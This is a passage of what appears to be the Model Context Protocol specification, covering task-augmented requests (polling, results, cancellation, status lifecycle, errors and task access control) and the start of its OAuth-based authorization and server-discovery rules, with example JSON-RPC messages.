their `tasks` capabilities to establish which operations support task-based execution. Requestors **SHOULD** only augment requests with a task if the corresponding capability has been declared by the receiver.\n\nFor example, if a server's capabilities include `tasks.requests.tools.call: {}`, then clients may augment `tools/call` requests with a task. If a client's capabilities include `tasks.requests.sampling.createMessage: {}`, then servers may augment `sampling/createMessage` requests with a task.\n\nIf `capabilities.tasks` is not defined, the peer **SHOULD NOT** attempt to create tasks during requests.\n\nThe set of capabilities in `capabilities.tasks.requests` is exhaustive. If a request type is not present, it does not support task-augmentation.\n\n`capabilities.tasks.list` controls if the `tasks/list` operation is supported by the party.\n\n`capabilities.tasks.cancel` controls if the `tasks/cancel` operation is supported by the party.\n\n### Tool-Level Negotiation\n\nTool calls are given special consideration for the purpose of task augmentation. In the result of `tools/list`, tools declare support for tasks via `execution.taskSupport`, which if present can have a value of `\"required\"`, `\"optional\"`, or `\"forbidden\"`.\n\nThis is to be interpreted as a fine-grained layer in addition to capabilities, following these rules:\n\n1. If a server's capabilities do not include `tasks.requests.tools.call`, then clients **MUST NOT** attempt to use task augmentation on that server's tools, regardless of the `execution.taskSupport` value.\n1. If a server's capabilities include `tasks.requests.tools.call`, then clients consider the value of `execution.taskSupport`, and handle it accordingly:\n   1. If `execution.taskSupport` is not present or `\"forbidden\"`, clients **MUST NOT** attempt to invoke the tool as a task. Servers **SHOULD** return a `-32601` (Method not found) error if a client attempts to do so. This is the default behavior.\n   1. If `execution.taskSupport` is `\"optional\"`, clients **MAY** invoke the tool as a task or as a normal request.\n   1. If `execution.taskSupport` is `\"required\"`, clients **MUST** invoke the tool as a task. Servers **MUST** return a `-32601` (Method not found) error if a client does not attempt to do so.\n\n## Protocol Messages\n\n### Creating Tasks\n\nTask-augmented requests follow a two-phase response pattern that differs from normal requests:\n\n- **Normal requests**: The server processes the request and returns the actual operation result directly.\n- **Task-augmented requests**: The server accepts the request and immediately returns a `CreateTaskResult` containing task data. The actual operation result becomes available later through `tasks/result` after the task completes.\n\nTo create a task, requestors send a request with the `task` field included in the request params. Requestors **MAY** include a `ttl` value indicating the desired task lifetime duration (in milliseconds) since its creation.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"get_weather\",\n    \"arguments\": {\n      \"city\": \"New York\"\n    },\n    \"task\": {\n      \"ttl\": 60000\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"task\": {\n      \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n      \"status\": \"working\",\n      \"statusMessage\": \"The operation is now in progress.\",\n      \"createdAt\": \"2025-11-25T10:30:00Z\",\n      \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n      \"ttl\": 60000,\n      \"pollInterval\": 5000\n    }\n  }\n}\n```\n\nWhen a receiver accepts a task-augmented request, it returns a [`CreateTaskResult`](/specification/2025-11-25/schema#createtaskresult) containing task data. The response does not include the actual operation result. The actual result (e.g., tool result for `tools/call`) becomes available only through `tasks/result` after the task completes.\n\n<Note>\n\nWhen a task is created in response to a `tools/call` request, host applications may wish to return control to the model while the task is executing. This allows the model to continue processing other requests or perform additional work while waiting for the task to complete.\n\nTo support this pattern, servers can provide an optional `io.modelcontextprotocol/model-immediate-response` key in the `_meta` field of the `CreateTaskResult`. The value of this key should be a string intended to be passed as an immediate tool result to the model.\nIf a server does not provide this field, the host application can fall back to its own predefined message.\n\nThis guidance is non-binding and is provisional logic intended to account for the specific use case. This behavior may be formalized or modified as part of `CreateTaskResult` in future protocol versions.\n\n</Note>\n\n### Getting Tasks\n\n<Note>\n\nIn the Streamable HTTP (SSE) transport, clients **MAY** disconnect from an SSE stream opened by the server in response to a `tasks/get` request at any time.\n\nWhile this note is not prescriptive regarding the specific usage of SSE streams, all implementations **MUST** continue to comply with the existing [Streamable HTTP transport specification](../transports#sending-messages-to-the-server).\n\n</Note>\n\nRequestors poll for task completion by sending [`tasks/get`](/specification/2025-11-25/schema#tasks%2Fget) requests.\nRequestors **SHOULD** respect the `pollInterval` provided in responses when determining polling frequency.\n\nRequestors **SHOULD** continue polling until the task reaches a terminal status (`completed`, `failed`, or `cancelled`), or until encountering the [`input_required`](#input-required-status) status. Note that invoking `tasks/result` does not imply that the requestor needs to stop polling - requestors **SHOULD** continue polling the task status via `tasks/get` if they are not actively waiting for `tasks/result` to complete.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"tasks/get\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n    \"status\": \"working\",\n    \"statusMessage\": \"The operation is now in progress.\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n    \"ttl\": 30000,\n    \"pollInterval\": 5000\n  }\n}\n```\n\n### Retrieving Task Results\n\n<Note>\n\nIn the Streamable HTTP (SSE) transport, clients **MAY** disconnect from an SSE stream opened by the server in response to a `tasks/result` request at any time.\n\nWhile this note is not prescriptive regarding the specific usage of SSE streams, all implementations **MUST** continue to comply with the existing [Streamable HTTP transport specification](../transports#sending-messages-to-the-server).\n\n</Note>\n\nAfter a task completes the operation result is retrieved via [`tasks/result`](/specification/2025-11-25/schema#tasks%2Fresult). This is distinct from the initial `CreateTaskResult` response, which contains only task data. The result structure matches the original request type (e.g., `CallToolResult` for `tools/call`).\n\nTo retrieve the result of a completed task, requestors can send a `tasks/result` request:\n\nWhile `tasks/result` blocks until the task reaches a terminal status, requestors can continue polling via `tasks/get` in parallel if they are not actively blocked waiting for the result, such as if their previous `tasks/result` request failed or was cancelled. This allows requestors to monitor status changes or display progress updates while the task executes, even after invoking `tasks/result`.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"method\": \"tasks/result\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Current weather in New York:\\nTemperature: 72°F\\nConditions: Partly cloudy\"\n      }\n    ],\n    \"isError\": false,\n    \"_meta\": {\n      \"io.modelcontextprotocol/related-task\": {\n        \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n      }\n    }\n  }\n}\n```\n\n### Task Status Notification\n\nWhen a task status changes, receivers **MAY** send a [`notifications/tasks/status`](/specification/2025-11-25/schema#notifications%2Ftasks%2Fstatus) notification to inform the requestor of the change. This notification includes the full task state.\n\n**Notification:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/tasks/status\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n    \"status\": \"completed\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:50:00Z\",\n    \"ttl\": 60000,\n    \"pollInterval\": 5000\n  }\n}\n```\n\nThe notification includes the full [`Task`](/specification/2025-11-25/schema#task) object, including the updated `status` and `statusMessage` (if present). This allows requestors to access the complete task state without making an additional `tasks/get` request.\n\nRequestors **MUST NOT** rely on receiving this notifications, as it is optional. Receivers are not required to send status notifications and may choose to only send them for certain status transitions. Requestors **SHOULD** continue to poll via `tasks/get` to ensure they receive status updates.\n\n### Listing Tasks\n\nTo retrieve a list of tasks, requestors can send a [`tasks/list`](/specification/2025-11-25/schema#tasks%2Flist) request. This operation supports pagination.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"method\": \"tasks/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"result\": {\n    \"tasks\": [\n      {\n        \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n        \"status\": \"working\",\n        \"createdAt\": \"2025-11-25T10:30:00Z\",\n        \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n        \"ttl\": 30000,\n        \"pollInterval\": 5000\n      },\n      {\n        \"taskId\": \"abc123-def456-ghi789\",\n        \"status\": \"completed\",\n        \"createdAt\": \"2025-11-25T09:15:00Z\",\n        \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n        \"ttl\": 60000\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Cancelling Tasks\n\nTo explicitly cancel a task, requestors can send a [`tasks/cancel`](/specification/2025-11-25/schema#tasks%2Fcancel) request.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 6,\n  \"method\": \"tasks/cancel\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 6,\n  \"result\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n    \"status\": \"cancelled\",\n    \"statusMessage\": \"The task was cancelled by request.\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n    \"ttl\": 30000,\n    \"pollInterval\": 5000\n  }\n}\n```\n\n## Behavior Requirements\n\nThese requirements apply to all parties that support receiving task-augmented requests.\n\n### Task Support and Handling\n\n1. Receivers that do not declare the task capability for a request type **MUST** process requests of that type normally, ignoring any task-augmentation metadata if present.\n1. Receivers that declare the task capability for a request type **MAY** return an error for non-task-augmented requests, requiring requestors to use task augmentation.\n\n### Task ID Requirements\n\n1. Task IDs **MUST** be a string value.\n1. Task IDs **MUST** be generated by the receiver when creating a task.\n1. Task IDs **MUST** be unique among all tasks controlled by the receiver.\n\n### Task Status Lifecycle\n\n1. Tasks **MUST** begin in the `working` status when created.\n1. Receivers **MUST** only transition tasks through the following valid paths:\n   1. From `working`: may move to `input_required`, `completed`, `failed`, or `cancelled`\n   1. From `input_required`: may move to `working`, `completed`, `failed`, or `cancelled`\n   1. Tasks with a `completed`, `failed`, or `cancelled` status are in a terminal state and **MUST NOT** transition to any other status\n\n**Task Status State Diagram:**\n\n```mermaid\nstateDiagram-v2\n    [*] --> working\n\n    working --> input_required\n    working --> terminal\n\n    input_required --> working\n    input_required --> terminal\n\n    terminal --> [*]\n\n    note right of terminal\n        Terminal states:\n        • completed\n        • failed\n        • cancelled\n    end note\n```\n\n### Input Required Status\n\n<Note>\n\nWith the Streamable HTTP (SSE) transport, servers often close SSE streams after delivering a response message, which can lead to ambiguity regarding the stream used for subsequent task messages.\n\nServers can handle this by enqueueing messages to the client to side-channel task-related messages alongside other responses.\n\nServers have flexibility in how they manage SSE streams during task polling and result retrieval, and clients **SHOULD** expect messages to be delivered on any SSE stream, including the HTTP GET stream.\nOne possible approach is maintaining an SSE stream on `tasks/result` (see notes on the `input_required` status).\nWhere possible, servers **SHOULD NOT** upgrade to an SSE stream in response to a `tasks/get` request, as the client has indicated it wishes to poll for a result.\n\nWhile this note is not prescriptive regarding the specific usage of SSE streams, all implementations **MUST** continue to comply with the existing [Streamable HTTP transport specification](../transports#sending-messages-to-the-server).\n\n</Note>\n\n1. When the task receiver has messages for the requestor that are necessary to complete the task, the receiver **SHOULD** move the task to the `input_required` status.\n1. The receiver **MUST** include the `io.modelcontextprotocol/related-task` metadata in the request to associate it with the task.\n1. When the requestor encounters the `input_required` status, it **SHOULD** preemptively call `tasks/result`.\n1. When the receiver receives all required input, the task **SHOULD** transition out of `input_required` status (typically back to `working`).\n\n### TTL and Resource Management\n\n1. Receivers **MUST** include a `createdAt` [ISO 8601](https://datatracker.ietf.org/doc/html/rfc3339#section-5)-formatted timestamp in all task responses to indicate when the task was created.\n1. Receivers **MUST** include a `lastUpdatedAt` [ISO 8601](https://datatracker.ietf.org/doc/html/rfc3339#section-5)-formatted timestamp in all task responses to indicate when the task was last updated.\n1. Receivers **MAY** override the requested `ttl` duration.\n1. Receivers **MUST** include the actual `ttl` duration (or `null` for unlimited) in `tasks/get` responses.\n1. After a task's `ttl` lifetime has elapsed, receivers **MAY** delete the task and its results, regardless of the task status.\n1. Receivers **MAY** include a `pollInterval` value (in milliseconds) in `tasks/get` responses to suggest polling intervals. Requestors **SHOULD** respect this value when provided.\n\n### Result Retrieval\n\n1. Receivers that accept a task-augmented request **MUST** return a `CreateTaskResult` as the response. This result **SHOULD** be returned as soon as possible after accepting the task.\n1. When a receiver receives a `tasks/result` request for a task in a terminal status (`completed`, `failed`, or `cancelled`), it **MUST** return the final result of the underlying request, whether that is a successful result or a JSON-RPC error.\n1. When a receiver receives a `tasks/result` request for a task in any other non-terminal status (`working` or `input_required`), it **MUST** block the response until the task reaches a terminal status.\n1. For tasks in a terminal status, receivers **MUST** return from `tasks/result` exactly what the underlying request would have returned, whether that is a successful result or a JSON-RPC error.\n\n### Associating Task-Related Messages\n\n1. All requests, notifications, and responses related to a task **MUST** include the `io.modelcontextprotocol/related-task` key in their `_meta` field, with the value set to an object with a `taskId` matching the associated task ID.\n   1. For example, an elicitation that a task-augmented tool call depends on **MUST** share the same related task ID with that tool call's task.\n1. For the `tasks/get`, `tasks/result`, and `tasks/cancel` operations, the `taskId` parameter in the request **MUST** be used as the source of truth for identifying the target task. Requestors **SHOULD NOT** include `io.modelcontextprotocol/related-task` metadata in these requests, and receivers **MUST** ignore such metadata if present in favor of the RPC method parameter.\n   Similarly, for the `tasks/get`, `tasks/list`, and `tasks/cancel` operations, receivers **SHOULD NOT** include `io.modelcontextprotocol/related-task` metadata in the result messages, as the `taskId` is already present in the response structure.\n\n### Task Notifications\n\n1. Receivers **MAY** send `notifications/tasks/status` notifications when a task's status changes.\n1. Requestors **MUST NOT** rely on receiving the `notifications/tasks/status` notification, as it is optional.\n1. When sent, the `notifications/tasks/status` notification **SHOULD NOT** include the `io.modelcontextprotocol/related-task` metadata, as the task ID is already present in the notification parameters.\n\n### Task Progress Notifications\n\nTask-augmented requests support progress notifications as defined in the [progress](./progress) specification. The `progressToken` provided in the initial request remains valid throughout the task lifetime.\n\n### Task Listing\n\n1. Receivers **SHOULD** use cursor-based pagination to limit the number of tasks returned in a single response.\n1. Receivers **MUST** include a `nextCursor` in the response if more tasks are available.\n1. Requestors **MUST** treat cursors as opaque tokens and not attempt to parse or modify them.\n1. If a task is retrievable via `tasks/get` for a requestor, it **MUST** be retrievable via `tasks/list` for that requestor.\n\n### Task Cancellation\n\n1. Receivers **MUST** reject cancellation requests for tasks already in a terminal status (`completed`, `failed`, or `cancelled`) with error code `-32602` (Invalid params).\n1. Upon receiving a valid cancellation request, receivers **SHOULD** attempt to stop the task execution and **MUST** transition the task to `cancelled` status before sending the response.\n1. Once a task is cancelled, it **MUST** remain in `cancelled` status even if execution continues to completion or fails.\n1. The `tasks/cancel` operation does not define deletion behavior. However, receivers **MAY** delete cancelled tasks at their discretion at any time, including immediately after cancellation or after the task `ttl` expires.\n1. Requestors **SHOULD NOT** rely on cancelled tasks being retained for any specific duration and should retrieve any needed information before cancelling.\n\n## Message Flow\n\n### Basic Task Lifecycle\n\n```mermaid\nsequenceDiagram\n    participant C as Client (Requestor)\n    participant S as Server (Receiver)\n    Note over C,S: 1.

The task state includes:\n\n- `taskId`: Unique identifier for the task\n- `status`: Current state of the task execution\n- `statusMessage`: Optional human-readable message describing the current state (can be present for any status, including error details for failed tasks)\n- `createdAt`: ISO 8601 timestamp when the task was created\n- `ttl`: Time in milliseconds from creation before task may be deleted\n- `pollInterval`: Suggested time in milliseconds between status checks\n- `lastUpdatedAt`: ISO 8601 timestamp when the task status was last updated\n\n### Task Status\n\nTasks can be in one of the following states:\n\n- `working`: The request is currently being processed.\n- `input_required`: The receiver needs input from the requestor. The requestor should call `tasks/result` to receive input requests, even though the task has not reached a terminal state.\n- `completed`: The request completed successfully and results are available.\n- `failed`: The associated request did not complete successfully. For tool calls specifically, this includes cases where the tool call result has `isError` set to true.\n- `cancelled`: The request was cancelled before completion.\n\n### Task Parameters\n\nWhen augmenting a request with task execution, the `task` field is included in the request parameters:\n\n```json\n{\n  \"task\": {\n    \"ttl\": 60000\n  }\n}\n```\n\nFields:\n\n- `ttl` (number, optional): Requested duration in milliseconds to retain task from creation\n\n### Related Task Metadata\n\nAll requests, responses, and notifications associated with a task **MUST** include the `io.modelcontextprotocol/related-task` key in `_meta`:\n\n```json\n{\n  \"io.modelcontextprotocol/related-task\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\nThis associates messages with their originating task across the entire request lifecycle.\n\nFor the `tasks/get`, `tasks/list`, and `tasks/cancel` operations, requestors and receivers **SHOULD NOT** include this metadata in their messages, as the `taskId` is already present in the message structure.\nThe `tasks/result` operation **MUST** include this metadata in its response, as the result structure itself does not contain the task ID.\n\n## Error Handling\n\nTasks use two error reporting mechanisms:\n\n1. **Protocol Errors**: Standard JSON-RPC errors for protocol-level issues\n1. **Task Execution Errors**: Errors in the underlying request execution, reported through task status\n\n### Protocol Errors\n\nReceivers **MUST** return standard JSON-RPC errors for the following protocol error cases:\n\n- Invalid or nonexistent `taskId` in `tasks/get`, `tasks/result`, or `tasks/cancel`: `-32602` (Invalid params)\n- Invalid or nonexistent cursor in `tasks/list`: `-32602` (Invalid params)\n- Attempt to cancel a task already in a terminal status: `-32602` (Invalid params)\n- Internal errors: `-32603` (Internal error)\n\nAdditionally, receivers **MAY** return the following errors:\n\n- Non-task-augmented request when receiver requires task augmentation for that request type: `-32600` (Invalid request)\n\nReceivers **SHOULD** provide informative error messages to describe the cause of errors.\n\n**Example: Task augmentation required**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32600,\n    \"message\": \"Task augmentation required for tools/call requests\"\n  }\n}\n```\n\n**Example: Task not found**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 70,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Failed to retrieve task: Task not found\"\n  }\n}\n```\n\n**Example: Task expired**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 71,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Failed to retrieve task: Task has expired\"\n  }\n}\n```\n\n<Note>\n\nReceivers are not required to retain tasks indefinitely. It is compliant behavior for a receiver to return an error stating the task cannot be found if it has purged an expired task.\n\n</Note>\n\n**Example: Task cancellation rejected (already terminal)**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 74,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Cannot cancel task: already in terminal status 'completed'\"\n  }\n}\n```\n\n### Task Execution Errors\n\nWhen the underlying request does not complete successfully, the task moves to the `failed` status. This includes JSON-RPC protocol errors during request execution, or for tool calls specifically, when the tool result has `isError` set to true. The `tasks/get` response **SHOULD** include a `statusMessage` field with diagnostic information about the failure.\n\n**Example: Task with execution error**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f820fe840\",\n    \"status\": \"failed\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n    \"ttl\": 30000,\n    \"statusMessage\": \"Tool execution failed: API rate limit exceeded\"\n  }\n}\n```\n\nFor tasks that wrap tool call requests, when the tool result has `isError` set to `true`, the task should reach `failed` status.\n\nThe `tasks/result` endpoint returns exactly what the underlying request would have returned:\n\n- If the underlying request resulted in a JSON-RPC error, `tasks/result` **MUST** return that same JSON-RPC error.\n- If the request completed with a JSON-RPC response, `tasks/result` **MUST** return a successful JSON-RPC response containing that result.\n\n## Security Considerations\n\n### Task Isolation and Access Control\n\nTask IDs are the primary mechanism for accessing task state and results. Without proper access controls, any party that can guess or obtain a task ID could potentially access sensitive information or manipulate tasks they did not create.\n\nWhen an authorization context is provided, receivers **MUST** bind tasks to said context.\n\nContext-binding is not practical for all applications. Some MCP servers operate in environments without authorization, such as single-user tools, or use transports that don't support authorization.\nIn these scenarios, receivers **SHOULD** document this limitation clearly, as task results may be accessible to any requestor that can guess the task ID.\nIf context-binding is unavailable, receivers **MUST** generate cryptographically secure task IDs with enough entropy to prevent guessing and should consider using shorter TTL durations to reduce the exposure window.\n\nIf context-binding is available, receivers **MUST** reject `tasks/get`, `tasks/result`, and `tasks/cancel` requests for tasks that do not belong to the same authorization context as the requestor. For `tasks/list` requests, receivers **MUST** ensure the returned task list includes only tasks associated with the requestor's authorization context.\n\nAdditionally, receivers **SHOULD** implement rate limiting on task operations to prevent denial-of-service and enumeration attacks.\n\n### Resource Management\n\n1. Receivers **SHOULD**:\n   1. Enforce limits on concurrent tasks per requestor\n   1. Enforce maximum `ttl` durations to prevent indefinite resource retention\n   1. Clean up expired tasks promptly to free resources\n   1. Document maximum supported `ttl` duration\n   1. Document maximum concurrent tasks per requestor\n   1. Implement monitoring and alerting for resource usage\n\n### Audit and Logging\n\n1. Receivers **SHOULD**:\n   1. Log task creation, completion, and retrieval events for audit purposes\n   1. Include auth context in logs when available\n   1. Monitor for suspicious patterns (e.g., many failed task lookups, excessive polling)\n1. Requestors **SHOULD**:\n   1. Log task lifecycle events for debugging and audit purposes\n   1. Track task IDs and their associated operations\n"}

This specification defines the authorization flow for HTTP-based transports.\n\n### Protocol Requirements\n\nAuthorization is **OPTIONAL** for MCP implementations. When supported:\n\n- Implementations using an HTTP-based transport **SHOULD** conform to this specification.\n- Implementations using an STDIO transport **SHOULD NOT** follow this specification, and\n  instead retrieve credentials from the environment.\n- Implementations using alternative transports **MUST** follow established security best\n  practices for their protocol.\n\n### Standards Compliance\n\nThis authorization mechanism is based on established specifications listed below, but\nimplements a selected subset of their features to ensure security and interoperability\nwhile maintaining simplicity:\n\n- OAuth 2.1 IETF DRAFT ([draft-ietf-oauth-v2-1-13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13))\n- OAuth 2.0 Authorization Server Metadata\n  ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))\n- OAuth 2.0 Dynamic Client Registration Protocol\n  ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591))\n- OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))\n- OAuth Client ID Metadata Documents ([draft-ietf-oauth-client-id-metadata-document-00](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00))\n\n## Roles\n\nA protected _MCP server_ acts as an [OAuth 2.1 resource server](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles),\ncapable of accepting and responding to protected resource requests using access tokens.\n\nAn _MCP client_ acts as an [OAuth 2.1 client](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles),\nmaking protected resource requests on behalf of a resource owner.\n\nThe _authorization server_ is responsible for interacting with the user (if necessary) and issuing access tokens for use at the MCP server.\nThe implementation details of the authorization server are beyond the scope of this specification. It may be hosted with the\nresource server or a separate entity. The [Authorization Server Discovery section](#authorization-server-discovery)\nspecifies how an MCP server indicates the location of its corresponding authorization server to a client.\n\n## Overview\n\n1. Authorization servers **MUST** implement OAuth 2.1 with appropriate security\n   measures for both confidential and public clients.\n\n2. Authorization servers and MCP clients **SHOULD** support OAuth Client ID Metadata Documents\n   ([draft-ietf-oauth-client-id-metadata-document-00](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00)).\n\n3. Authorization servers and MCP clients **MAY** support the OAuth 2.0 Dynamic Client Registration\n   Protocol ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)).\n\n4. MCP servers **MUST** implement OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728)).\n   MCP clients **MUST** use OAuth 2.0 Protected Resource Metadata for authorization server discovery.\n\n5. MCP authorization servers **MUST** provide at least one of the following discovery mechanisms:\n   - OAuth 2.0 Authorization Server Metadata ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))\n   - [OpenID Connect Discovery 1.0](https://openid.net/specs/openid-connect-discovery-1_0.html)\n\n   MCP clients **MUST** support both discovery mechanisms to obtain the information required to interact with the authorization server.\n\n## Authorization Server Discovery\n\nThis section describes the mechanisms by which MCP servers advertise their associated\nauthorization servers to MCP clients, as well as the discovery process through which MCP\nclients can determine authorization server endpoints and supported capabilities.\n\n### Authorization Server Location\n\nMCP servers **MUST** implement the OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))\nspecification to indicate the locations of authorization servers. The Protected Resource Metadata document returned by the MCP server **MUST** include\nthe `authorization_servers` field containing at least one authorization server.\n\nThe specific use of `authorization_servers` is beyond the scope of this specification; implementers should consult\nOAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728)) for\nguidance on implementation details.\n\nImplementors should note that Protected Resource Metadata documents can define multiple authorization servers. The responsibility for selecting which authorization server to use lies with the MCP client, following the guidelines specified in\n[RFC9728 Section 7.6 \"Authorization Servers\"](https://datatracker.ietf.org/doc/html/rfc9728#name-authorization-servers).\n\n### Protected Resource Metadata Discovery Requirements\n\nMCP servers **MUST** implement one of the following discovery mechanisms to provide authorization server location information to MCP clients:\n\n1. **WWW-Authenticate Header**: Include the resource metadata URL in the `WWW-Authenticate` HTTP header under `resource_metadata` when returning `401 Unauthorized` responses, as described in [RFC9728 Section 5.1](https://datatracker.ietf.org/doc/html/rfc9728#name-www-authenticate-response).\n\n2. **Well-Known URI**: Serve metadata at a well-known URI as specified in [RFC9728](https://datatracker.ietf.org/doc/html/rfc9728). This can be either:\n   - At the path of the server's MCP endpoint: `https://example.com/public/mcp` could host metadata at `https://example.com/.well-known/oauth-protected-resource/public/mcp`\n   - At the root: `https://example.com/.well-known/oauth-protected-resource`\n\nMCP clients **MUST** support both discovery mechanisms and use the resource metadata URL from the parsed `WWW-Authenticate` headers when present; otherwise, they **MUST** fall back to constructing and requesting the well-known URIs in the order listed above.\n\nMCP servers **SHOULD** include a `scope` parameter in the `WWW-Authenticate` header as defined in\n[RFC 6750 Section 3](https://datatracker.ietf.org/doc/html/rfc6750#section-3)\nto indicate the scopes required for accessing the resource. This provides clients with immediate\nguidance on the appropriate scopes to request during authorization,\nfollowing the principle of least privilege and preventing clients from requesting excessive permissions.\n\nThe scopes included in the `WWW-Authenticate` challenge **MAY** match `scopes_supported`, be a subset\nor superset of it, or an alternative collection that is neither a strict subset nor\nsuperset. Clients **MUST NOT** assume any particular set relationship between the challenged\nscope set and `scopes_supported`. Clients **MUST** treat the scopes provided in the\nchallenge as authoritative for satisfying the current request. Servers **SHOULD** strive for\nconsistency in how they construct scope sets but they are not required to surface every dynamically\nissued scope through `scopes_supported`.\n\nExample 401 response with scope guidance:\n\n```http\nHTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer resource_metadata=\"https://mcp.example.com/.well-known/oauth-protected-resource\",\n                         scope=\"files:read\"\n```\n\nMCP clients **MUST** be able to parse `WWW-Authenticate` headers and respond appropriately to `HTTP 401 Unauthorized` responses from the MCP server.\n\nIf the `scope` parameter is absent, clients **SHOULD** apply the fallback behavior defined in the [Scope Selection Strategy](#scope-selection-strategy) section.\n\n### Authorization Server Metadata Discovery\n\nTo handle different issuer URL formats and ensure interoperability with both OAuth 2.0 Authorization Server Metadata and OpenID Connect Discovery 1.0 specifications, MCP clients **MUST** attempt multiple well-known endpoints when discovering authorization server metadata.\n\nThe discovery approach is based on [RFC8414 Section 3.1 \"Authorization Server Metadata Request\"](https://datatracker.ietf.org/doc/html/rfc8414#section-3.1) for OAuth 2.0 Authorization Server Metadata discovery and [RFC8414 Section 5 \"Compatibility Notes\"](https://datatracker.ietf.org/doc/html/rfc8414#section-5) for OpenID Connect Discovery 1.0 interoperability.\n\nFor issuer URLs with path components (e.g., `https://auth.example.com/tenant1`), clients **MUST** try endpoints in the following priority order:\n\n1. OAuth 2.0 Authorization Server Metadata with path insertion: `https://auth.example.com/.well-known/oauth-authorization-server/tenant1`\n2. OpenID Connect Discovery 1.0 with path insertion: `https://auth.example.com/.well-known/openid-configuration/tenant1`\n3. OpenID Connect Discovery 1.0 path appending: `https://auth.example.com/tenant1/.well-known/openid-configuration`\n\nFor issuer URLs without path components (e.g., `https://auth.example.com`), clients **MUST** try:\n\n1. OAuth 2.0 Authorization Server Metadata: `https://auth.example.com/.well-known/oauth-authorization-server`\n2. OpenID Connect Discovery 1.0: `https://auth.example.com/.well-known/openid-configuration`\n\n### Authorization Server Discovery Sequence Diagram\n\nThe following diagram outlines an example flow:\n\n```mermaid\nsequenceDiagram\n    participant C as Client\n    participant M as MCP Server (Resource Server)\n    participant A as Authorization Server\n\n    Note over C: Attempt unauthenticated MCP request\n    C->>M: MCP request without token\n    M-->>C: HTTP 401 Unauthorized (may include WWW-Authenticate header)\n\n    alt Header includes resource_metadata\n        Note over C: Extract resource_metadata URL from header\n        C->>M: GET resource_metadata URI\n        M-->>C: Resource metadata with authorization server URL\n    else No resource_metadata in header\n        Note over C: Fallback to well-known URI probing\n        Note over M: _Not applicable if the MCP server is at the 